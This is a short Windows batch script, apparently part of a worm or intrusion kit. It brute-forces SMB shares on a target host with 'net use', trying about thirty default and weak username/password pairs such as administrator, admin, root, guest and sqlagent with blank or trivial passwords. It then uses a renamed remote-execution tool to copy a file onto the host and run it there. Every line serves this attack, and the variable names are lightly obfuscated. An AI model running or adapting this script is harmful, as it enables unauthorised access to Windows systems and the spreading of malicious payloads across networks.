@echo off
set mrddosj00=net use
set upload0r=pmmc32
%mrddosj00% \\%1\%2 "" /user:administrator
%mrddosj00% \\%1\%2 "administrator" /user:administrator
%mrddosj00% \\%1\%2 "Administrator" /user:administrator
%mrddosj00% \\%1\%2 "" /user:administrador
%mrddosj00% \\%1\%2 "administrador" /user:administrador
%mrddosj00% \\%1\%2 "Administrador" /user:administrador
%mrddosj00% \\%1\%2 "sqlagent" /user:sqlagent
%mrddosj00% \\%1\%2 "" /user:admin
%mrddosj00% \\%1\%2 "Admin" /user:admin
%mrddosj00% \\%1\%2 "admin" /user:admin
%mrddosj00% \\%1\%2 "123" /user:admin
%mrddosj00% \\%1\%2 "12345" /user:admin
%mrddosj00% \\%1\%2 "" /user:root
%mrddosj00% \\%1\%2 "root" /user:root
%mrddosj00% \\%1\%2 "teacher" /user:teacher
%mrddosj00% \\%1\%2 "student" /user:student
%mrddosj00% \\%1\%2 "" /user:test
%mrddosj00% \\%1\%2 "test" /user:test
%mrddosj00% \\%1\%2 "" /user:cs
%mrddosj00% \\%1\%2 "sql" /user:sql
%mrddosj00% \\%1\%2 "database" /user:database
%mrddosj00% \\%1\%2 "user" /user:user
%mrddosj00% \\%1\%2 "network" /user:network
%mrddosj00% \\%1\%2 "wwwadmin" /user:wwwadmin
%mrddosj00% \\%1\%2 "sqladmin" /user:sqladmin
%mrddosj00% \\%1\%2 "123" /user:administrator
%mrddosj00% \\%1\%2 "12345" /user:administrator
%mrddosj00% \\%1\%2 "" /user:wwwroot
%mrddosj00% \\%1\%2 "" /user:guest
%mrddosj00% \\%1\%2 "guest" /user:guest
%mrddosj00% \\%1\%2 "" /user:server
%mrddosj00% \\%1\%2 "server" /user:server
%upload0r% \\%1 attrib.exe -r %3
%upload0r% \\%1 -f -c -d %3 -o
%upload0r% \\%1 -d %3 -o